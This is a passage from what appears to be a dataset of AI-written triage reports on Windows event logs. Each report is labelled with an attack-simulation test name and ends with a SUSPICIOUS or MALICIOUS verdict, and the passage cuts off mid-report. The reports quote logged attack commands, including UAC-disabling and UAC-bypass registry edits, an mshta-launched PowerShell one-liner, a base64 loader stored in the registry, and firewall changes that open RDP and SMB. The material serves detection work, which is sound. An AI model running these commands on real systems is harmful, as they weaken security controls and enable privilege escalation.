   - Observing the PowerShell logs, there is repeated execution of a command that utilizes `rundll32.exe` to execute `calc.exe` via PowerShell:
     ```plaintext
     HostApplication=powershell.exe & {rundll32.exe zipfldr.dll,RouteTheCall ""%windir%\System32\calc.exe""}
     ```
   - While `calc.exe` is a legitimate Windows application, the method utilized (`rundll32.exe` with `zipfldr.dll`) to run it is not standard behavior and is often associated with obfuscation techniques used in malware to launch a hidden or unwanted application, avoiding easy detection.

2. **System and Security Logs:**
   - Both the System and Security logs appear normal, mainly showing time synchronization events. There's no directly evident suspicious activity here that stands out as malicious, assuming the time synchronization was expected and the server is configured to update its time at such intervals.

3. **Sysmon Logs:**
   - Sysmon logs indicate multiple executions of `conhost.exe` and `wevtutil.exe`, which appear to be normal background Windows operations. However, these are followed up by PowerShell launching `rundll32.exe` for `calc.exe`:
     ```plaintext
     Image=""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""
     ParentCommandLine=""\""powershell.exe\"" & {rundll32.exe zipfldr.dll,RouteTheCall \""'%windir%\\System32\\calc.exe'\""}""
     ```
   - Similar to the PowerShell logs, launching `calc.exe` using `rundll32.exe` with the PowerShell parent process could be considered suspicious, especially in a context where such activity is not expected.
   - This sequence might indicate a pattern of potentially malicious behavior, specifically using `rundll32` to mask process execution.

4. **Application Logs:**
   - Application logs generally show benign activities such as Edge updates, which are typical Windows maintenance actions. 

### Conclusion:

Based on the analysis of these logs, there is a suspicious pattern arising from the execution of `calc.exe` via `PowerShell` and `rundll32.exe`. While this isn't inherently indicative of malicious activity, as the executed application is a standard Windows calculator, the method used suggests an attempt at evasion or concealment, which aligns with the behavior of certain types of malware.

### Resolution: **SUSPICIOUS**

**Guidance on how to proceed:**
- It's essential to ascertain any legitimate reason for the `rundll32` and PowerShell execution pattern. Contact users or administrators of `Server002` to verify if this was expected or part of any scheduled tasks.
- Review the system for any recently installed or unauthorized software that might explain the logs' behavior.
- Conduct a deeper investigation on the file system and current processes to ensure there are no hidden, potentially malicious activities.
- Implement stricter monitoring for any future unauthorized use of `rundll32.exe` with PowerShell, as such patterns should be under close scrutiny in enterprise environments."
Mimic Ransomware - Allow Multiple RDP Sessions per User,"Upon analyzing the provided Windows event logs, we can observe several activities associated with process creations and privilege assignments. Below are the key observations and detailed analysis:

### Suspicious and Anomalous Behavior

1. **Frequent Use of `wevtutil.exe` and `conhost.exe`:**
   - There are several logs where `wevtutil.exe` and `conhost.exe` are used repeatedly within a short span (Event IDs 17951 to 17968, 17971 to 17972).
   - `wevtutil.exe` is commonly used for querying, backing up, and clearing event logs. Its frequent invocation could indicate log tampering or reconnaissance actions by an attacker.
   - `conhost.exe` is a legitimate Windows process, but its recurrence in rapid succession might relate to the multiple execution contexts being spawned.

2. **Unusual Command-Line Execution:**
   - The execution of `cmd.exe` for modifying the Windows Registry (Event ID 17977). The command ""`cmd.exe\"" /c reg add \""HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\"" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f`"" alters terminal server settings, potentially allowing multiple RDP sessions, which is not typical for routine tasks.
   - Following this, `reg.exe` is used to execute the registry modification command line directly (Event ID 17979).

3. **Privilege Escalation:**
   - Security log ID 4672 indicates the enablement of a wide range of privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others for the user `admin_test`. These privileges allow significant control over the system and, if used maliciously, can lead to compromise.

4. **Time Manipulation:**
   - There are two-time change events in quick succession in the system logs (Event IDs 3569 and 3572). Time manipulation can be indicative of an attempt to mask actions or confuse log timings.

5. **Process Hierarchy and User Context:**
   - Most activities are executed under the user `SERVER002\admin_test`, suggesting an elevated level of access was used throughout these processes.
   - However, changing registry settings and obtaining special privileges under this user context can signal potential misuse.

### Assessment

Given the frequent execution of potentially administrative or intrusive commands (`wevtutil.exe`, registry changes), elevation of privileges, and time changes, these activities are suspicious and warrant further investigation. While they might be legitimate administrative tasks, such activities should be validated against planned changes or administrative scripts. The sequencing and context under which these commands were executed suggest possible malicious intent.

### Resolution

**SUSPICIOUS**: The logs contain activity that doesn't look right and requires further investigation. Specifically, you should:

- Verify if the `admin_test` account executed these actions and check against authorized tasks or scripts.
- Investigate whether the time change events were part of scheduled or legitimate maintenance activities.
- Monitor for any other unusual behavior on the system to determine if this is part of a broader attack strategy.
- Consider conducting a full security audit and potentially deploying additional security measures or alerts for similar activities in the future."
CheckIfInstallable method call,"Upon analyzing the provided Windows event logs, several elements suggest possible anomalous and potentially suspicious behavior, primarily related to the use of Windows PowerShell. Below is a detailed assessment:

1. **Windows PowerShell Activity**:
   - The logs show multiple instances of Windows PowerShell (`powershell.exe`) being executed by a user `SERVER002\admin_test`. 
   - The command lines for these executions involve scripts located in a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\InstallUtilTestHarness.ps1`) and the execution of a file (`data.004.dll`) that is apparently being created or modified dynamically. This includes complex logic involving `Invoke-BuildAndInvokeInstallUtilAssembly`, which can be a vector for malicious activities like code injection or persistence mechanisms.

2. **Use of Compiler Tools**:
   - There are logs indicating the use of `csc.exe` (C# compiler) pointing to compiling activities using files from a temporary directory. This along with the execution of `cvtres.exe` (resource to COFF conversion utility) suggests program compilation and conversion activity happening locally, which is unusual outside of software development environments or automated build systems. 

3. **Execution of Administrative and Security Utilities**:
   - Tools like `wevtutil.exe`, `whoami.exe`, and frequent instances of `conhost.exe` are seen being executed. While these tools have legitimate administrative purposes, their frequent invocation, particularly after a PowerShell script execution, signals potential script-run persistence or monitoring setup.

4. **Microsoft Edge Update Activity**:
   - Multiple commands are related to Microsoft Edge updates. These operations are often legitimate, but when combined with other suspicious PowerShell activities, can serve as a vector for concealing malicious activities (such as using trusted applications to evade detection).

5. **Notable Command-Line Patterns**:
   - Specific commands incorporate obfuscated elements and use of temporary directories, which are common tactics for obfuscating malicious intentions. The use of strings like `Invoke-BuildAndInvokeInstallUtilAssembly` indicates scripts designed to manipulate .NET assemblies, furthering the case for suspicious rather than routine system administration.

In conclusion, these factors do not directly highlight a known malware signature but exhibit patterns frequently associated with malicious activities, such as privilege escalation, reconnaissance, system manipulation, or persistence installation via scripting and temporary directories.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed**:
- **Further Investigation**: Collect additional context around the activities of `admin_test`, including their usual tasks and expected system access levels.
- **Threat Intelligence**: Check the specific file hashes against known threat databases to identify potential threats.
- **Enhance Monitoring**: Increase the scrutiny on processes that have frequently triggered, particularly PowerShell and compiler-related actions from temp directories.
- **User Verification**: Verify if the actions performed align with legitimate user activities or if credentials could have been compromised."
Allow SMB and RDP on Microsoft Defender Firewall,"In analyzing the provided Windows event logs, I have identified several noteworthy points that require detailed discussion:

### 1. Sysmon Logs:
- **Process Execution**: Many of the entries involve common system utilities (`wevtutil.exe`, `conhost.exe`, `svchost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, `netsh.exe`). Of particular note is the command executed by `cmd.exe`: 
  ```
  ""cmd.exe"" /c netsh advfirewall firewall set rule group=""remote desktop"" new enable=Yes & netsh advfirewall firewall set rule group=""file and printer sharing"" new enable=Yes
  ```
  This command alters the firewall rules to allow Remote Desktop and file/printer sharing. While this action could be legitimate in a controlled environment, it can also serve as an indicator of malicious intent, especially if performed without documented administrative approval.

- **User Context**: Most of the processes are executed under the user `SERVER002\\admin_test` with a high integrity level, indicating administrative privileges are being utilized. 

- **Parent Process**: Repeated use of `wsmprovhost.exe` as a parent process is seen for several commands executed, possibly indicating this host process is being used to execute shell commands.

### 2. Security Logs:
- **Time Change**: Event ID 4616 notes changes to system time, a method sometimes used by attackers to evade detection or logs analysis. Although the time change is slight, it's worth noting and correlating with other suspicious activities.

### 3. Application Logs:
- **Edge Update**: Several logs detail the update activities of Microsoft Edge. This looks to be legitimate background operations for updating Edge, given Microsoft's digital signature and the context of similar events.

### 4. System Logs:
- **Time Adjustments**: Confirmed in system logs as well; this aligns with what I observed in the security logs regarding time change.

### Assessment:
Given that the observed logs are occurring within a similar timeframe and that key system utilities are being manipulated, this could reflect administrative activity, automated tasks, or unsanctioned actions. The key flags include changes to remote desktop settings and system time adjustments.

### Resolution:
- **SUSPICIOUS**: Although a definitive malicious intent cannot be confirmed without further data, the manipulation of firewall settings and time adjustments are key activities that could imply preparative steps for unauthorized remote access or malicious intent. Further investigation is warranted:
  - Verify with the admin_test user or responsible team for any legitimate changes or maintenance activities during this time.
  - Check for any related security alerts or incidents reported around this time.
  - Review network traffic and any unusual data exfiltration that may correlate with these events.

### Guidance:
- Conduct a thorough verification process for all administrative actions performed during this period.
- Monitor for repeated patterns of similar activities and augment alerting for changes in pivotal system configurations.
- Improve audit logging for better traceability of administrative commands.

Further steps must include coordination with the IT team to validate these activities and potentially involve IR (Incident Response) if unauthorized actions are suspected."
attrib - Remove read-only attribute,"### Analysis of the Logs

After a thorough review of the provided Windows event logs, the following points of interest and concerns have been identified:

#### Key Observations:
1. **Frequent Use of Command Line:**
   - The logs show multiple executions of `cmd.exe` for creating temporary directories, moving, and setting file attributes (`attrib.exe`). These actions, albeit suspicious if unsolicited, do not exhibit clear indicators of compromised states or malware activities without additional context.

2. **Use of `wevtutil.exe`:**
   - `wevtutil.exe` is utilized multiple times. This utility handles event logs. If its executions are unscheduled or unauthorized, it could indicate logs tampering, especially if it correlates with privilege escalation or sensitive operations.

3. **Edge Update Activity:**
   - **Multiple Processes:** There are several entries involving Microsoft Edge Update processes and operations. This could be deemed normal unless the behavior deviates from regular patterns for Edge updates.
   - **Command Line Activity:** Edge Update is invoked with various commands, including `update`, `regsvc`, and `ping`. This activity appears to involve typical update operations, including registration and verification of update installations.

4. **Execution by SYSTEM User:**
   - Many processes executed under the `NT AUTHORITY\SYSTEM` context, indicating they have high privileges. This is expected for Microsoft Edge Update services but should be monitored for unexpected non-Microsoft processes.

#### Indicators of Suspicion:
- **Repeated Wevtutil Use:** While legitimate, its unscheduled or non-standard usage could hint at log manipulation or cleaning attempts.
- **High Privilege Operations:** Continuous monitoring is required to ensure all such operations are expected and align with system update or servicing activities.
  
#### Assessment:
- **Wevtutil Usage:** Frequent invocations by the same user must be further investigated to confirm whether it aligns with legitimate administrative actions or operational maintenance schedules.
- **Edge Update Logs:** Though generally benign due to Microsoft's update cycle, ensuring these are not spoofed or maliciously tampered with is advised.

### Resolution
**SUSPICIOUS**

Given the frequency and context of certain utility executions, especially `cmd.exe` operations for handling temporary files and `wevtutil.exe` activities, additional investigation is warranted to rule out any unauthorized changes or malicious attempts. Continuous monitoring and cross-referencing with typical behavior baselining of the system involved would be crucial to distinguishing truly benign activities from potential threats.

### Recommended Actions:
1. **Verification of User Intent:** Engage with system administrators to validate whether the observed behaviors were authorized or part of scheduled tasks.
2. **Increase Monitoring:** Enhance logging and look for any anomalies or patterns suggesting information being altered or deleted, particularly related to logs.
3. **Integrity Checks:** Perform integrity checks on the system to ensure no tampering has occurred with critical files and logs.
4. **Context Collaboration:** Collaborate with IT and network infrastructures to understand the context of updates and validate all Edge Update activities are legitimate.
5. **Review System Policies:** Ensure all actions conform to organizational IT policies and update procedures to establish assurance.
"
Windows HideSCAVolume Group Policy Feature,"Upon reviewing the provided Windows event logs, several activities stand out which merit deeper scrutiny. Here is a detailed analysis of the logs:

### Analysis of Logs:

1. **Time Change Events:**
   - There are multiple instances of time changes occurring almost instantaneously.
   - In the `System log`, we observe `EventID: 24`, `EventID: 1` from `Microsoft-Windows-Kernel-General`, and `EventID: 35` from `Microsoft-Windows-Time-Service`.
   - Adjustments of the system time could be normal, depending on NTP synchronization; however, any irregularities in time management can be exploited by malicious actors to hide or manipulate logs.

2. **Command Line Activities:**
   - The `Sysmon log` captures a `cmd.exe` process (`ProcessId: 5732`) executing a command to modify the registry to hide the system control volume (`CommandLine: \""cmd.exe\"" /c reg add \""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\"" /v HideSCAVolume /t REG_DWORD /d 1 /f""`).
   - Changes to Windows registry, especially those that affect visibility or configuration settings, can be indicative of persistence mechanisms or attempts to obfuscate the system state.

3. **Privilege Escalation:**
   - The `Security log` shows an event (`EventID: 4672`) indicating the granting of special privileges to the `admin_test` account. These privileges include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others that represent high-level system permissions.
   - While privilege escalation can be part of normal administrative duties, it is also frequently leveraged by attackers to gain more control over a compromised system.

4. **Frequent Use of Edge Update:**
   - Numerous entries detail the execution of `MicrosoftEdgeUpdate.exe`. While frequent updates can be normal for software maintenance, it is important to verify that these updates are expected and legitimate.
   - Monitoring for any unsigned or unusual applications being executed under legitimate processes can help detect suspicious activities.

### Assessment:

- **Time Change Events:** Requires verification whether these time changes are scheduled NTP synchronizations. Consistent unscheduled changes might point to log manipulation.
- **Registry Modifications:** Any registry changes like those logged should be investigated further to ensure they are sanctioned and not indicative of malicious intent.
- **Privilege Escalation:** Ensure that the privileges granted to the account `admin_test` are justified and appropriately logged to match expected administrative activity.
- **Process Execution:** Confirm the legitimacy of recurring `MicrosoftEdgeUpdate.exe` runs for any signs of abuse or masquerading.

### Conclusion:

**Resolution: SUSPICIOUS**

The activities observed in the logs demonstrate behavior typical of malicious intent, such as modifying system settings and registry entries without clear justification, suspicious privilege escalations, and frequent executions of update-related processes. Though there are no unequivocal signs of compromise, these activities warrant a thorough investigation to rule out any malicious activity. It is advised to:
- Correlate time-change events with legitimate NTP updates.
- Review system policies for registry changes.
- Validate recent administrative activities and any related logging.
- Monitor and conduct threat detection over network data, processes, and logs for enhanced security assurance.

Depending on further investigation outcomes, security advisories should be prepared for potential malicious activity, and adequate preventive measures must be ensured to safeguard system integrity."
Disable UAC using reg.exe,"### Analysis and Findings:

The logs contain various events from multiple channels, including Application, System, Sysmon, and Security logs. The primary focus should be on identifying suspicious behavior in process execution, command-line arguments, and system changes. Here's the breakdown of the logs:

#### Application Log:
- **`edgeupdate` Service Events:** Multiple instances of the `edgeupdate` service stopping are shown. This service is related to Microsoft Edge browser updates and does not give any immediate cause for concern unless paired with unrelated suspicious behavior.
- **`SPP` Service Event:** A log entry for `Software Protection Platform Service` (`SPP`) indicates its usual operation with `RulesEngine`. This is typical and doesn't present any direct evidence of malicious activity.

#### System Log:
- **Time Change Events:** Several logs indicate a change in system time, specifically involving `svchost.exe` as the process making the adjustments. Time changes themselves are not inherently suspicious unless there is evidence of them being used to obscure audit trails.

#### Sysmon Log:
- **Command Execution with `cmd.exe`:** A process event shows `cmd.exe` executing a command to modify a registry setting related to `EnableLUA` (User Account Control), setting it to 0, which typically disables UAC. This action could indicate an attempt to bypass user account control protections:
  - Command: `""cmd.exe"" /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f`
- **Executes Microsoft Edge Update:** Multiple process creations associated with `MicrosoftEdgeUpdate.exe` are present. These could be legitimate update processes, but the frequency and command-line arguments should be scrutinized in a larger context.

#### Security Log:
- **Time-Related Security Events:** Security audit events match those of system time changes involving `svchost.exe`. Consistency across logs indicates standard system time updates.

### Assessment:
- The most significant suspicious activity is the registry modification to disable UAC, which constitutes a reduction in security controls. This could be an indicator of privilege escalation attempts.
- The frequent occurrences of `MicrosoftEdgeUpdate.exe` appear consistent with automatic update behaviors. However, they should be verified against known and expected update frequencies specific to this system's environment.

### Resolution:
Given the identified suspicious registry modification, more investigation is warranted into this behavior, particularly the circumstances and user context in which it was executed. The registry change, coupled with the lack of context or reasoning for it, elevates the need for further scrutiny into potential unauthorized or malicious intent.

**Final Resolution: SUSPICIOUS**
- **Recommendation:** Conduct a thorough review of registry changes, especially around the `EnableLUA` setting.
- **Action Plan:** 
  - Verify the authenticity and authorization of accounts involved in the registry change.
  - Monitor for any further unauthorized changes or unusual system behavior.
  - Review the systems' configuration for valid update processes and verify user actions/permissions around the time of the event in question."
UACME Bypass Method 61,"### Analysis of Logs:

1. **Application Log:**
   - The logs largely indicate benign reports of Windows Defender's state being on, which is expected and does not suggest any malicious activity.

2. **Sysmon Log:**
   - **Command Execution:** There are several instances of command-line executions with high integrity levels such as `cmd.exe` and `powershell.exe`. Specifically, `cmd.exe` executing with `/c echo ... Akagi64.exe` and PowerShell executing scripts could be flagged as anomalous, especially in administrative or critical directories.
   - **Suspicious File Locations:** The command `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\script\61 Akagi64.exe` is potentially suspicious. Files executed from a `Temp` folder, especially with complex paths like this, should be scrutinized for malicious intent.
   - **Process Creations:** The logs also show many normal system processes (like `svchost.exe`, `conhost.exe`, etc.) being executed, which do not directly indicate suspicious behavior, barring any unusual command lines.

3. **Security Log:**
   - **Privileged Logons:** There are multiple instances of logon events (ID 4624) and privileged service startup (ID 4672), which are not unusual, but consistent privileged actions in a short span should be analyzed for potential privilege escalation attempts.
   - **Credential Events (5379):** A series of 5379 events with return code `3221226021` suggest unsuccessful attempts to read credentials. This may suggest attempts to access accounts or services and should be investigated to ensure these actions align with regular operations.

### Assessment:

- **Suspicious Elements:**
  - Executing files from suspicious paths in the temp directory with administrative privileges (notably the command involving `Akagi64.exe`) constitutes suspicious behavior potentially indicative of post-exploitation activities, such as persistence mechanisms or lateral movement.
  - A high concentration of specific command-line interactions and credential access attempts raises a red flag.

- **Benign Elements:**
  - Most system and security processes, including regular Windows Update processes (`CompatTelRunner.exe`, `UsoClient.exe`), do not display inherently suspicious behavior and remain consistent with normal operation.

### Recommendation: 

Based on the analysis, the resolution is **SUSPICIOUS**. The unusual command-line paths and repeated credential access attempts suggest activity that lies outside normal operating patterns and requires further investigation.

**Next Steps:**
- Conduct a detailed forensic analysis of the `Akagi64.exe` to assess its intent and origin.
- Investigate the source and intent of credential access attempts and any associated user accounts or services.
- Ensure system integrity by checking Windows Defender logs and performing a full system scan. 
- Monitor for recurrence of similar activities and set up alerts for similar executions or script paths in security monitoring tools."
Execute base64-encoded PowerShell from Windows Registry,"Upon analyzing the provided logs, here are my observations and findings:

### PowerShell Log Analysis

1. **Encoded PowerShell Commands**: 
   - Multiple PowerShell events indicate the use of a base64 encoded command executed via `IEX` (Invoke-Expression). This is a potential red flag since it can be used to obfuscate the execution of potentially malicious scripts. The encoded command `powershell.exe -Command ""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion Debug).Debug)))""` indicates this obfuscation technique.

2. **Registry Modification**:
   - The script writes encoded commands into the Windows Registry under `HKCU:Software\Microsoft\Windows\CurrentVersion -Name Debug`, which can be used to store malicious payloads for persistence.

### Sysmon Log Analysis

1. **PowerShell Execution**:
   - Sysmon logs show multiple instances of PowerShell being invoked, corroborating the details from the PowerShell logs. Execution includes what appears to be a script designed to obfuscate its intentions.

2. **Use of `wevtutil.exe` and `conhost.exe`**:
   - Frequent usage of `wevtutil.exe` (Windows Event Log utility) might indicate log clearing activities. However, without correlating actions, static invocation is not immediately suspicious.
   - `conhost.exe` is frequently executed, predominantly as a child process of PowerShell and other commands, which could indicate scripted automation or an attacker maintaining sessions via command line.

### System & Application Log Analysis

1. **Defender States**:
   - Windows Defender is reported to be turned on (`SECURITY_PRODUCT_STATE_ON`), indicating that it should be providing some level of protection. This suggests that if there is suspicious activity, it bypassed or was undetected by Defender.

2. **Windows Update Activities**:
   - The logs show standard system updates to Windows Defender Antivirus signatures, which appears to be a routine operation.

### Security Log Analysis

1. **Privilege Escalations**:
   - Event ID 4672 indicates that the `SYSTEM` user holds powerful privileges (e.g., `SeDebugPrivilege`, `SeBackupPrivilege`). While expected for the `SYSTEM` account, it nonetheless underscores the importance of the account in potential security investigations.

2. **Failed Credential Reads**:
   - Event ID 5379 shows attempts to access Microsoft account credentials, all returning an error code `3221226021` (Access Denied), potentially indicating unauthorized or failing scripts accessing the credential store.

### Assessment

- **SUSPICIOUS**: The combination of obfuscated PowerShell commands, registry manipulation, and unauthorized attempts at accessing credentials suggest activities that are not typical for legitimate administrative tasks. The indication of potentially storing and executing code from the registry is a common tactic used by attackers.
  
### Guidance

1. **Immediate Actions**:
   - Decode and analyze the content of the base64 encoded PowerShell commands to verify if they perform any malicious actions.
   - Inspect the system for any unauthorized modifications, particularly in the registry.
   - Check historical context around this event timestamp to identify possible initial compromise vectors (e.g., phishing, external remote connections).

2. **Ongoing Monitoring and Analysis**:
   - Continue monitoring PowerShell and Sysmon logs for signs of similar behavior and additional unauthorized/unexplained activities.
   - Enhance Windows Defender and related security tools to look for specific indicators observed in these logs.

3. **Containment and Remediation**:
   - If further analysis supports the suspicion, proceed to isolate the system from the network and conduct a full forensic investigation.
   - Plan for system cleanup, either through restoring from backups or rebuilding the system if malicious activity is confirmed.

This situation warrants additional investigation to confirm whether the activity constitutes a genuine threat or if there are legitimate operational explanations."
Bypass UAC using Event Viewer (PowerShell),"Upon analyzing the provided Windows event logs, several activities are noted. Here's a detailed analysis:

### Key Observations:

1. **Sysmon Logs:**
   - Repeated use of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. While normally used for managing event logs and hosting console sessions, respectively, repeated execution in a short span can sometimes indicate script-based activity or automation.
   - A PowerShell command is executed to manipulate the registry: it adds a new item at `HKCU:\software\classes\mscfile\shell\open\command` and sets its default value to execute `C:\Windows\System32\cmd.exe`. This is often linked to a known UAC bypass technique leveraging the Windows Event Viewer.
   
2. **Security Logs:**
   - Standard log-on (event ID 4624) and privilege assignment (event ID 4672) entries for `admin_test`, which typically occur during legitimate administrative tasks.
   - The presence of NTLM authentication from `DESKTOP-3HL5B2P` to `SERVER002`, indicating that the `admin_test` user might be accessing the server remotely. 

3. **Application Logs:**
   - Microsoft Edge Update service events, which are typical in-system activity for maintaining the browser. No anomalies detected here.

4. **System Logs:**
   - Time synchronization events which appear normal for time correction and management.

5. **PowerShell Logs:**
   - Logs confirm the suspicious PowerShell activity identified in the Sysmon logs, specifically tied to a potential UAC bypass through `eventvwr.msc`. 

### Assessment:

The presence of registry manipulation via PowerShell command execution aiming to set the default value for `mscfile` to open `cmd.exe` can facilitate privilege escalation by bypassing User Account Control (UAC). This often indicates a potentially malicious action as it attempts to execute commands with elevated privileges without prompt or user consent.

### Conclusion:

**Resolution: MALICIOUS**

The activity of modifying the registry in this manner, combined with launching processes consistently and in an automated fashion, suggests a potential compromise aiming to bypass UAC for privilege escalation. Immediate remediation is recommended, including:
- Isolating the affected system.
- Reviewing and reversing the registry changes.
- Conducting a thorough forensic analysis to identify any further malicious actions or installed malware.
- Performing a comprehensive review of any connections made from `DESKTOP-3HL5B2P`.

### Guidance:
Further investigation into how the ""admin_test"" account is being used is crucial. Determine whether this activity was initiated by a legitimate administrator or through credential theft. Fortify the system with enhanced monitoring for similar registry changes and leverage application whitelisting to prevent unauthorized execution of scripts."
Mshta used to Execute PowerShell,"After reviewing the provided logs, the following analysis focuses on identifying any suspicious activity or indicators of compromise:

1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`:**
   - The logs show multiple executions of `wevtutil.exe` and `conhost.exe` processes. This could be part of normal operation, but excessive or pattern-based repetition could indicate an attempt to access or tamper with event logs. However, without additional context like command-line arguments or the alignment with known malicious usage patterns, these entries alone are considered potentially suspicious rather than conclusively malicious.

2. **Execution of `hostname.exe`, `whoami.exe`, and `cmd.exe`:**
   - The execution of common Windows utilities like `hostname.exe` and `whoami.exe` is generally benign. It could be part of routine admin tasks. However, these entries mark the pathway leading to the more concerning behavior with `cmd.exe`.

3. **Suspicious PowerShell Invocation via `mshta.exe`:**
   - A notable entry is the execution of a command through `cmd.exe` with this command line: 
     ```
     ""cmd.exe"" /c mshta.exe ""about:&lt;hta:application&gt;&lt;script language=\""VBScript\""&gt;Close(Execute(\""CreateObject(\""\""Wscript.Shell\""\"").Run%20\""\""powershell.exe%20-nop%20-Command%20Write-Host%20Hello,%20MSHTA!;Start-Sleep%20-Seconds%205\""\""\""))&lt;/script&gt;""
     ```
   - This behavior is particularly suspicious. The use of `mshta.exe` to execute scripts or commands is a common technique seen in attacks, often used to bypass security mechanisms and perform malicious actions via PowerShell. The Powershell command uses `-nop` (no profile) and includes a `Write-Host` statement which often masks the true intent behind executing PowerShell. This indicates a potential misuse and is a strong indicator of malicious activity.

4. **Time Synchronization and `svchost.exe`:**
   - There is evidence of time adjustments and interactions with `svchost.exe`, but these seem to be system or service level operations without additional signs of malicious intent within the context of these logs.

5. **Reference to `wsmprovhost.exe` and `TrustedInstaller.exe`:**
   - `wsmprovhost.exe` and `TrustedInstaller.exe` process entries in relation to administrative tasks appear routine. However, if these align with unusual user actions or unauthorized access patterns, then further scrutiny would be warranted.

**Conclusion and Resolution:**
- **Resolution: MALICIOUS**
  - The behavior reflected in the invocation of `mshta.exe` for executing a potentially obfuscated PowerShell script poses a high risk and aligns with common malicious techniques, specifically indicating a potential code execution attack vector. This is significant enough to classify the activity as malicious, warranting immediate further investigation and containment.

**Guidance:**
- **Immediate Actions:**
  - Isolate the affected machine for a detailed forensic investigation to prevent potential lateral movement or data exfiltration.
  - Review network traffic and logs for any signs of data being sent to unknown external sources.
  - Assess any potential impacts on sensitive data or systems and escalate as necessary.
- **Preventative Measures:**
  - Implement strict monitoring and alerting for similar behaviors involving `mshta.exe`, `PowerShell`, and non-standard execution paths.
  - Review and tighten security policies, particularly around script execution and the use of administrative tools.
  - Conduct security awareness training for administrators and users regarding recognizing and avoiding phishing or malicious scripts."
Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement,"Upon analyzing the logs provided, there are several points of interest that may indicate suspicious or even potentially malicious activity. Below is a detailed analysis of the key findings:

1. **PowerShell Activity**:
    - Multiple instances of `powershell.exe` are executed, with command lines suggestive of script execution. One particular command stands out:
      ```
      ""powershell.exe"" {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\system32\mshta.exe}
      ```
      - This command indicates the use of PowerShell to execute potentially malicious scripts using `Invoke-ATHHTMLApplication`. The use of HTA files and leveraging `mshta.exe` is a known tactic for script execution and lateral movement within networks.

2. **Frequent Use of `wevtutil.exe`**:
    - The `wevtutil.exe` command was executed multiple times by the same user in quick succession. While `wevtutil.exe` is a legitimate tool for managing Windows event logs, frequent execution in short intervals without clear legitimate needs might suggest log tampering or deletion activities often associated with malicious operations.

3. **High Integrity Level**:
    - The processes running under a high integrity level indicates that they have elevated privileges. Combined with the type of the command being executed, this raises further suspicion as malicious actors often exploit elevated privileges for persistence or broader access.

4. **Unusual Execution Context**:
    - The execution of PowerShell and conhost related processes from paths like `C:\Users\ADMIN_~1\AppData\Local\Temp\` can be a red flag. While the TEMP directory is often used for legitimate purposes, it is also a known location for storing and executing malicious scripts.

5. **Scheduled Windows Update Activities**:
    - Windows Update-related logs reflect routine updates. However, this activity might be used to mask malicious process activities under the guise of legitimate update operations.

**Assessment:**
Based on the analysis, the logs contain indicators of potentially malicious activities including the execution of suspicious PowerShell scripts indicative of an attack pattern that exploits HTA and lateral movement techniques, repeated execution of `wevtutil.exe`, execution context pointing to TEMP directories, and execution under high privilege levels. These activities suggest attempts to manipulate the system environment possibly for unauthorized access or persistence.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- **Immediate Isolation & Further Investigation**: Isolate the affected host (Server002) from the network to prevent potential spread of any malware or unauthorized access.
- **Detailed Analysis**: Perform a detailed forensic investigation to assess any unauthorized changes or file manipulations and check for persistence mechanisms.
- **Review User Activity**: Closely examine the activities of the user `SERVER002\admin_test` for anomalies and validate if their credentials have been compromised.
- **Update Security Measures**: Ensure that security measures (like intrusion detection systems and antivirus) are up to date to prevent further occurrences.
- **Strengthen Logging and Monitoring**: Implement comprehensive logging and increase monitoring capabilities to better capture and analyze suspicious activities in real time.

This assessment should be considered as a flag for potentially harmful activities, warranting further investigation to confirm and remediate any security incidents."
Compiled HTML Help Local Payload,"After conducting a detailed analysis of the provided logs, here is the assessment:

### Security Log Analysis:
1. **Event ID 4624 (Multiple Occurrences):** These represent successful logons. Noteworthy entries involve the `admin_test` account, which appears to use NTLM authentication from a specific workstation (`DESKTOP-3HL5B2P`). While NTLM from another machine (`fe80::e3b5:5371:12a8:9c77`) might be normal, it could also be suspicious if unexpected or unauthorized.
   
2. **Event ID 4672:** Indicates that `admin_test` was granted a set of special privileges (`SeDebugPrivilege`, `SeImpersonatePrivilege`, etc.). This suggests potential administrative level actions, which could be usual for an admin account; however, if unauthorized or out of pattern, it may be worth investigating further. 

3. **Event ID 4634:** Indicates the logoff of `admin_test`. The sequence of logon-logoff should be checked against normal user behavior.

### Application Log Analysis:
1. **Windows Defender Status:** Security software is active and running (""SECURITY_PRODUCT_STATE_ON""), which is good for system protection.

### Sysmon Log Analysis:
1. **PowerShell Activity:** The presence of `powershell.exe` execution by `admin_test` stands out. If this execution was not authorized or expected, it may suggest scripting or command execution that could be part of a malicious activity.

2. **Command Execution & Process Creation:** 
   - Execution of commands like `whoami.exe` and `hostname.exe` are noted under `admin_test`. These commands are typically used for discovering system and user information, which might indicate reconnaissance.
   - The execution of `cmd.exe` with a command opening an HTML help file (`hh.exe`). This behavior is unusual if not directly known to be part of legitimate operations.
   
3. **Binary Paths and Executions Related to Microsoft Edge Updates:** Multiple events show `MicrosoftEdgeUpdate.exe` activities. This may just be regular update operations but should be confirmed against any scheduling or expected operations.

### Conclusions:
- **Suspicious Indicators:** The use of PowerShell, and administrative privileges granted to `admin_test` suggest a need for deeper investigation. The activity around logons and potential privilege use by `admin_test` should also be verified for legitimacy.
- **Normal Situations:** Routine activities of Windows Defender and Microsoft Edge updates appear not to present immediate concerns but are useful to verify under normal patterns.

### Recommendation:
- **Resolution:** **SUSPICIOUS**
- **Next Steps:**
